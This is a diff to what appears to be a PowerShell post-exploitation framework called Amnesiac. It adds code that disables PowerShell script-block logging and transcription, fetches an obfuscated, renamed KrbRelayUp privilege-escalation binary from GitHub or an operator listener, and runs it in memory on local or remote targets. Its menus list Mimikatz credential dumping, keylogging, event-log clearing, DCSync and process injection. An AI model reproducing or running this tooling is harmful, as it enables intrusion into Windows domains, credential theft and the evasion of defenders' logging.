@@ -120,7 +120,10 @@ function Get-EtwBypassSnippet {
 }
 
 function Get-SblBypassSnippet {
-    return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)}catch{}"
+    return (
+        "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)}catch{};" +
+        "try{`$_gp=[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Ut'+'ils').GetField('cachedGroup'+'PolicySettings','NonPublic,Static').GetValue(`$null);if(`$_gp['Transcription']){`$_gp['Transcription']['EnableTranscripting']=0}}catch{}"
+    )
 }
 function New-PayloadScript {
     param(
@@ -365,6 +368,14 @@ function Initialize-ToolCache {
     $global:ToolSources = @{
         'PsMapExec' = 'https://raw.githubusercontent.com/0xSiarheiStar/PsMapExec/main/PsMapExec.ps1'
     }
+
+    # KrbRelayUp — set to the renamed obfuscated binary filename uploaded to GitHub Releases
+    # e.g. $global:KrbRelayUpBin = 'InvokeKrb.exe'
+    # Upload: gh release upload v1.0-al Tools\<name>.exe --clobber
+    $global:KrbRelayUpBin = 'AuthHelper.exe'
+    if ($global:KrbRelayUpBin -ne 'CONFIGURE_ME.exe') {
+        $global:ToolSources[$global:KrbRelayUpBin] = "https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/$($global:KrbRelayUpBin)"
+    }
 }
 
 function Fetch-ToolFromGitHub {
@@ -390,8 +401,12 @@ function Fetch-ToolFromGitHub {
 function Fetch-BinaryTool {
     param([string]$ToolName)
     if ($global:ToolCache.ContainsKey($ToolName)) { return $true }
-    $exts = @('.exe', '.dll')
     $urls = @()
+    # Check ToolSources first — supports GitHub Releases and other custom URLs
+    if ($global:ToolSources -and $global:ToolSources.ContainsKey($ToolName)) {
+        $urls += $global:ToolSources[$ToolName]
+    }
+    $exts = @('.exe', '.dll')
     foreach ($ext in $exts) {
         if ($global:ListenerIP) { $urls += "http://$($global:ListenerIP):8080/$ToolName$ext" }
         $urls += "https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/$ToolName$ext"
@@ -2019,7 +2034,7 @@ function Start-LocalShell {
             Write-Output ""
             Write-Host " [+] User Activity:" -ForegroundColor Green
             Write-Host "   ClearHistory      " -NoNewline -ForegroundColor Yellow; Write-Host "Clear history for current user"
-            Write-Host "   ClearLogs         " -NoNewline -ForegroundColor Yellow; Write-Host "Clear logs from Event Viewer"
+            Write-Host "   ClearLogs         " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Clear logs from Event Viewer"
             Write-Host "   Clipboard         " -NoNewline -ForegroundColor Yellow; Write-Host "Get the clipboard (text)"
             Write-Host "   History           " -NoNewline -ForegroundColor Yellow; Write-Host "Get pwsh history for all users"
             Write-Host "   Keylog            " -NoNewline -ForegroundColor Yellow; Write-Host "Start keylogger - use: KeyLog ""C:\path\log.txt"""
@@ -2028,7 +2043,7 @@ function Start-LocalShell {
             Write-Host "   Screen4K          " -NoNewline -ForegroundColor Yellow; Write-Host "Take a screenshot [all monitors]"
             Write-Output ""
             Write-Host " [+] Scripts Loading:" -ForegroundColor Green
-            Write-Host "   Mimi              " -NoNewline -ForegroundColor Yellow; Write-Host "Load Mimikatz - use: Mimi -Command ""sekurlsa::logonpasswords"""
+            Write-Host "   Mimi              " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Load Mimikatz - use: Mimi -Command ""sekurlsa::logonpasswords"""
             Write-Host "   Patch             " -NoNewline -ForegroundColor Yellow; Write-Host "Patch AMSI (stays active this session)"
             Write-Host "   PatchNet          " -NoNewline -ForegroundColor Yellow; Write-Host "Patch AMSI .NET"
             Write-Host "   PInject           " -NoNewline -ForegroundColor Yellow; Write-Host "Load process injection module"
@@ -2041,26 +2056,26 @@ function Start-LocalShell {
             Write-Output ""
             Write-Host " [+] Local Actions:" -ForegroundColor Green
             Write-Host "   Ask4Creds         " -NoNewline -ForegroundColor Yellow; Write-Host "Prompt user for credentials"
-            Write-Host "   AutoMimi          " -NoNewline -ForegroundColor Yellow; Write-Host "Load Mimikatz and dump credentials immediately"
+            Write-Host "   AutoMimi          " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Load Mimikatz and dump credentials immediately"
             Write-Host "   CredMan           " -NoNewline -ForegroundColor Yellow; Write-Host "Dump Windows Credential Manager"
             Write-Host "   Dpapi             " -NoNewline -ForegroundColor Yellow; Write-Host "Retrieve credentials protected by DPAPI"
-            Write-Host "   GetSystem         " -NoNewline -ForegroundColor Yellow; Write-Host "Get a SYSTEM shell [remote session only]"
-            Write-Host "   HashGrab          " -NoNewline -ForegroundColor Yellow; Write-Host "Attempt to retrieve the hash of the current user"
-            Write-Host "   Hive              " -NoNewline -ForegroundColor Yellow; Write-Host "HiveDump - SAM / SYSTEM / SECURITY"
+            Write-Host "   GetSystem         " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Get a SYSTEM shell [remote session only]"
+            Write-Host "   HashGrab          " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Attempt to retrieve the hash of the current user"
+            Write-Host "   Hive              " -NoNewline -ForegroundColor Yellow; Write-Host "[A] HiveDump - SAM / SYSTEM / SECURITY"
             Write-Host "   Kerb              " -NoNewline -ForegroundColor Yellow; Write-Host "Dump Kerberos TGTs - use: Invoke-Kirby"
-            Write-Host "   Migrate ps <pid>  " -NoNewline -ForegroundColor Yellow; Write-Host "Inject into PID via AmnesiacLoader IndirectSyscall (no PInject needed)"
-            Write-Host "   Migrate <pid>     " -NoNewline -ForegroundColor Yellow; Write-Host "Inject shellcode into PID [requires PInject loaded first]"
+            Write-Host "   Migrate ps <pid>  " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Inject into PID via AmnesiacLoader IndirectSyscall (no PInject needed)"
+            Write-Host "   Migrate <pid>     " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Inject shellcode into PID [requires PInject loaded first]"
             Write-Host "   Monitor           " -NoNewline -ForegroundColor Yellow; Write-Host "Monitor cache for TGTs - use: TGT_Monitor"
             Write-Host "   MonitorRead       " -NoNewline -ForegroundColor Yellow; Write-Host "Retrieve TGTs from monitor activity"
             Write-Host "   MonitorClear      " -NoNewline -ForegroundColor Yellow; Write-Host "Clear TGTs from monitor activity"
             Write-Output ""
             Write-Host " [+] Domain Actions:" -ForegroundColor Green
             Write-Host "   CredValidate      " -NoNewline -ForegroundColor Yellow; Write-Host "Validate domain credentials - use: Validate-Credentials"
-            Write-Host "   DCSync            " -NoNewline -ForegroundColor Yellow; Write-Host "Perform DCSync - use: Invoke-DCSync"
-            Write-Host "   Impersonation     " -NoNewline -ForegroundColor Yellow; Write-Host "Token impersonation - use: Token-Impersonation"
+            Write-Host "   DCSync            " -NoNewline -ForegroundColor Yellow; Write-Host "[DA] Perform DCSync - use: Invoke-DCSync"
+            Write-Host "   Impersonation     " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Token impersonation - use: Token-Impersonation"
             Write-Host "   LocalAdminAccess  " -NoNewline -ForegroundColor Yellow; Write-Host "Check targets for local admin access"
             Write-Host "   PassSpray         " -NoNewline -ForegroundColor Yellow; Write-Host "Domain password spray - use: Invoke-PassSpray"
-            Write-Host "   Remoting          " -NoNewline -ForegroundColor Yellow; Write-Host "Remote command execution SMB/WMI - use: Invoke-SMBRemoting / Invoke-WMIRemoting"
+            Write-Host "   Remoting          " -NoNewline -ForegroundColor Yellow; Write-Host "[A] Remote command execution SMB/WMI - use: Invoke-SMBRemoting / Invoke-WMIRemoting"
             Write-Host "   winrm             " -NoNewline -ForegroundColor Green;  Write-Host "Deliver bind shell via WinRM (no session, no admin) -- winrm computername=<ip> username=<dom\user> password=<pass>"
             Write-Host "   winrmscan         " -NoNewline -ForegroundColor Green;  Write-Host "Find WinRM-accessible hosts for a credential -- winrmscan username=<dom\user> password=<pass> [range=10.x.x.1-254]"
             Write-Host "   dcom              " -NoNewline -ForegroundColor Green;  Write-Host "DCOM delivery (no admin, needs active session) -- dcom computername=<ip> [method=ShellWindows|ShellBrowserWindow|MMC20]"
@@ -2072,6 +2087,9 @@ function Start-LocalShell {
             Write-Host "   PowerUp           " -NoNewline -ForegroundColor Yellow; Write-Host "Run Invoke-AllChecks (PowerUp privilege escalation checks)"
             Write-Host "   PrivescCheck      " -NoNewline -ForegroundColor Yellow; Write-Host "Run Invoke-PrivescCheck (comprehensive LPE audit)"
             Write-Host "   GodPotato         " -NoNewline -ForegroundColor Yellow; Write-Host "Load GodPotato -- use: Invoke-GodPotato -cmd ""cmd /c whoami"""
+            Write-Host "   KrbRelayUp        " -NoNewline -ForegroundColor Yellow; Write-Host "Kerberos relay LPE (low-priv domain user → SYSTEM) -- KrbRelayUp full -m rbcd"
+            Write-Output ""
+            Write-Host " [*] " -NoNewline; Write-Host "[A]" -NoNewline -ForegroundColor Red; Write-Host " = local admin required   " -NoNewline; Write-Host "[DA]" -NoNewline -ForegroundColor Magenta; Write-Host " = domain admin required"
             Write-Output ""
             Write-Host " [*] Scenario 1: started via 'runas /netonly', all domain tools" -ForegroundColor DarkCyan
             Write-Host "     (PowerView, SessionHunter, PassSpray, etc.) automatically use" -ForegroundColor DarkCyan
@@ -2196,6 +2214,59 @@ function Start-LocalShell {
                 }
             } else {
                 Write-Host " [-] '$binName' not available. Ensure it is on the operator server or in Tools\." -ForegroundColor Red
+            }
+            continue
+        }
+
+        # ── KrbRelayUp: Kerberos relay LPE ───────────────────────────────────
+        if ($cmd -match '^(?i)KrbRelayUp\s*(.*)') {
+            $krb_args = $Matches[1].Trim()
+            if (-not $global:KrbRelayUpBin -or $global:KrbRelayUpBin -eq 'CONFIGURE_ME.exe') {
+                Write-Host " [-] KrbRelayUp binary name not configured." -ForegroundColor Red
+                Write-Host "     Set `$global:KrbRelayUpBin in Amnesiac.ps1 to the renamed binary filename." -ForegroundColor Red
+                continue
+            }
+            if ([string]::IsNullOrWhiteSpace($krb_args)) {
+                Write-Host ""
+                Write-Host " [*] KrbRelayUp — Kerberos relay LPE (low-priv domain user → SYSTEM)" -ForegroundColor Cyan
+                Write-Host ""
+                Write-Host "   [1] Shadow Credentials (requires ADCS):" -ForegroundColor Cyan
+                Write-Host "   KrbRelayUp full -m shadowcred --Domain <domain> --DomainController <DC_IP> --ForceShadowCred" -ForegroundColor Yellow
+                Write-Host "       -> new terminal session as SYSTEM" -ForegroundColor DarkGray
+                Write-Host ""
+                Write-Host "   [2] RBCD — new machine account:" -ForegroundColor Cyan
+                Write-Host "   KrbRelayUp full -m rbcd --Domain <domain> --DomainController <DC_IP> --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!'" -ForegroundColor Yellow
+                Write-Host "       -> new terminal session as SYSTEM" -ForegroundColor DarkGray
+                Write-Host ""
+                Write-Host "   [3] RBCD — spawn payload:" -ForegroundColor Cyan
+                Write-Host "   KrbRelayUp full -m rbcd --Domain <domain> --DomainController <DC_IP> --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!' -sc ""cmd.exe /c c:\users\<user>\Desktop\Payload.exe""" -ForegroundColor Yellow
+                Write-Host "       -> executes Payload.exe as SYSTEM" -ForegroundColor DarkGray
+                Write-Host ""
+                Write-Host " [*] Fetching binary into cache..." -ForegroundColor Cyan
+                Fetch-BinaryTool -ToolName $global:KrbRelayUpBin | Out-Null
+                continue
+            }
+            $krb_binargs = $krb_args -split '\s+' | Where-Object { $_ -ne '' }
+            $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $global:KrbRelayUpBin } | Select-Object -First 1
+            if (-not $cacheKey) {
+                if (Fetch-BinaryTool -ToolName $global:KrbRelayUpBin) { $cacheKey = $global:KrbRelayUpBin }
+            }
+            if ($cacheKey) {
+                try {
+                    $bytes = [Convert]::FromBase64String($global:ToolCache[$cacheKey])
+                    $asm   = [Reflection.Assembly]::Load($bytes)
+                    $ep    = $asm.EntryPoint
+                    if ($ep) {
+                        Write-Host " [+] Invoking KrbRelayUp ..." -ForegroundColor Green
+                        $ep.Invoke($null, @(,[string[]]$krb_binargs))
+                    } else {
+                        Write-Host " [-] No entry point in KrbRelayUp binary." -ForegroundColor Red
+                    }
+                } catch {
+                    Write-Host " [-] KrbRelayUp error: $($_.Exception.Message)" -ForegroundColor Red
+                }
+            } else {
+                Write-Host " [-] Could not fetch KrbRelayUp binary ($global:KrbRelayUpBin)." -ForegroundColor Red
             }
             continue
         }
@@ -4373,6 +4444,47 @@ function InteractWithPipeSession{
 					$sw.Flush()
 				} else {
 					Write-Output " [-] GodPotato not in cache. Add Invoke-GodPotato.ps1 to Tools\ and run: modules reload"
+				}
+			}
+		}
+
+		elseif ($command -match '^(?i)KrbRelayUp\s*(.*)') {
+			$krb_args = $Matches[1].Trim()
+			if (-not $global:KrbRelayUpBin -or $global:KrbRelayUpBin -eq 'CONFIGURE_ME.exe') {
+				Write-Output " [-] KrbRelayUp binary name not configured. Set `$global:KrbRelayUpBin in Amnesiac.ps1."
+			} elseif ([string]::IsNullOrWhiteSpace($krb_args)) {
+				Write-Output ""
+				Write-Output " [*] KrbRelayUp - Kerberos relay LPE (low-priv domain user -> SYSTEM)"
+				Write-Output ""
+				Write-Output "   [1] Shadow Credentials (requires ADCS):"
+				Write-Output "   KrbRelayUp full -m shadowcred --Domain <domain> --DomainController <DC_IP> --ForceShadowCred"
+				Write-Output "       -> new terminal session as SYSTEM"
+				Write-Output ""
+				Write-Output "   [2] RBCD - new machine account:"
+				Write-Output "   KrbRelayUp full -m rbcd --Domain <domain> --DomainController <DC_IP> --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!'"
+				Write-Output "       -> new terminal session as SYSTEM"
+				Write-Output ""
+				Write-Output "   [3] RBCD - spawn payload:"
+				Write-Output "   KrbRelayUp full -m rbcd --Domain <domain> --DomainController <DC_IP> --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!' -sc ""cmd.exe /c c:\users\<user>\Desktop\Payload.exe"""
+				Write-Output "       -> executes Payload.exe as SYSTEM"
+				Write-Output ""
+			} else {
+				$cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $global:KrbRelayUpBin } | Select-Object -First 1
+				if (-not $cacheKey) {
+					if (Fetch-BinaryTool -ToolName $global:KrbRelayUpBin) { $cacheKey = $global:KrbRelayUpBin }
+				}
+				if ($cacheKey) {
+					Write-Output " [+] Streaming KrbRelayUp to target..."
+					if (Send-Module -ToolName $cacheKey -Writer $sw -Reader $sr) {
+						$binBase = [System.IO.Path]::GetFileNameWithoutExtension($global:KrbRelayUpBin)
+						$invokeCmd = "[AppDomain]::CurrentDomain.GetAssemblies()|?{`$_.GetName().Name -eq '$binBase'}|Select-Object -Last 1|%{`$_.EntryPoint.Invoke(`$null,@(,[string[]]('$krb_args'-split ' ')))}"
+						$sw.WriteLine($invokeCmd)
+						$sw.Flush()
+					} else {
+						Write-Output " [-] Could not stream KrbRelayUp to target."
+					}
+				} else {
+					Write-Output " [-] Could not fetch KrbRelayUp binary ($global:KrbRelayUpBin)."
 				}
 			}
 		}
@@ -7427,12 +7539,12 @@ function Get-AvailableCommands  {
 	Write-Host " [+] User Activity:" -Foreground cyan
 	Write-Output ""
 	Write-Output " ClearHistory       Clear History for Current User"
-	Write-Output " ClearLogs          Clear Logs from Event Viewer"
+	Write-Output " ClearLogs          [A] Clear Logs from Event Viewer"
 	Write-Output " Clipboard          Get the clipboard (text)"
 	Write-Output " History            Get pwsh history for all users"
 	Write-Output " Keylog             Start Keylogger"
 	Write-Output " KeylogRead         Read Keylog output"
- 	Write-Output " RDPKeylog          Start RDP Keylogger"
+ 	Write-Output " RDPKeylog          [A] Start RDP Keylogger"
 	Write-Output " RDPKeylogRead      Read RDP Keylog output"
 	Write-Output " ScreenShot         Take a screenshot [1080p]"
 	Write-Output " Screen4K           Take a screenshot [4K]"
@@ -7440,7 +7552,7 @@ function Get-AvailableCommands  {
 	Write-Output ""
 	Write-Host " [+] Scripts Loading:" -Foreground cyan
 	Write-Output ""
-	Write-Output " Mimi               Load Katz"
+	Write-Output " Mimi               [A] Load Katz"
 	Write-Output " Patch              Patch 4MZI"
 	Write-Output " PatchNet           Patch 4MZI .NET"
 	Write-Output " PInject            Load ProcessInjection"
@@ -7453,30 +7565,30 @@ function Get-AvailableCommands  {
 	Write-Host " [+] Local Actions:" -Foreground cyan
 	Write-Output ""
 	Write-Output " Ask4Creds          Prompt User for Credentials"
-	Write-Output " AutoMimi           Load Katz and dump"
+	Write-Output " AutoMimi           [A] Load Katz and dump"
 	Write-Output " CredMan            CredManager Dump"
 	Write-Output " Dpapi              Retrieve credentials protected by DPAPI"
-	Write-Output " GetSystem          Get a System Shell [New Session]"
-	Write-Output " HashGrab           Attempt to retrieve the Hash of the current user"
-	Write-Output " Hive               HiveDump"
+	Write-Output " GetSystem          [A] Get a System Shell [New Session]"
+	Write-Output " HashGrab           [A] Attempt to retrieve the Hash of the current user"
+	Write-Output " Hive               [A] HiveDump"
 	Write-Output " Kerb               Kerb TGTs Dump"
-	Write-Output ' Migrate <pid>      Inject payload into specified pid [New Session]'
- 	Write-Output ' Migrate2 <pid>     Different migration syntax [In case the above fails]'
+	Write-Output ' Migrate <pid>      [A] Inject payload into specified pid [New Session]'
+ 	Write-Output ' Migrate2 <pid>     [A] Different migration syntax [In case the above fails]'
 	Write-Output " Monitor            Monitor Cache for TGTs"
 	Write-Output " MonitorRead        Retrieve TGTs from Monitor activity"
 	Write-Output " MonitorClear       Clear TGTs from Monitor activity"
-	Write-Output " MultiRDP           Patches termsrv.dll so that multiple users can RDP"
-	Write-Output " PPL                Bypass LSA Protection"
+	Write-Output " MultiRDP           [A] Patches termsrv.dll so that multiple users can RDP"
+	Write-Output " PPL                [A] Bypass LSA Protection"
 	Write-Output ""
 	Write-Output ""
 	Write-Host " [+] Domain Actions:" -Foreground cyan
 	Write-Output ""
 	Write-Output " CredValidate       Validate Domain Credentials"
-	Write-Output " DCSync             Performs DCSync"
-	Write-Output " Impersonation      Token Impersonation | Make or Steal a Token"
+	Write-Output " DCSync             [DA] Performs DCSync"
+	Write-Output " Impersonation      [A] Token Impersonation | Make or Steal a Token"
 	Write-Output " LocalAdminAccess   Check Targets for Local Admin Access"
 	Write-Output " PassSpray          Domain Password Spray"
-	Write-Output " Remoting           Remote Command Execution SMB|WMI|WinRM"
+	Write-Output " Remoting           [A] Remote Command Execution SMB|WMI|WinRM"
 	Write-Output " SessionHunter      Hunt for Active User Sessions"
 	Write-Output ""
 	Write-Output ""
@@ -7485,7 +7597,10 @@ function Get-AvailableCommands  {
 	Write-Output " PowerUp            Run Invoke-AllChecks (PowerUp)"
 	Write-Output " PrivescCheck       Run Invoke-PrivescCheck"
 	Write-Output " GodPotato          Load GodPotato (prompts for command)"
+	Write-Output " KrbRelayUp         Kerberos relay LPE (low-priv domain user -> SYSTEM) -- KrbRelayUp full -m rbcd"
 	Write-Output ""
+	Write-Output ""
+	Write-Host " [*] " -NoNewline; Write-Host "[A]" -NoNewline -ForegroundColor Red; Write-Host " = local admin required   " -NoNewline; Write-Host "[DA]" -NoNewline -ForegroundColor Magenta; Write-Host " = domain admin required"
 	Write-Output ""
 }
 
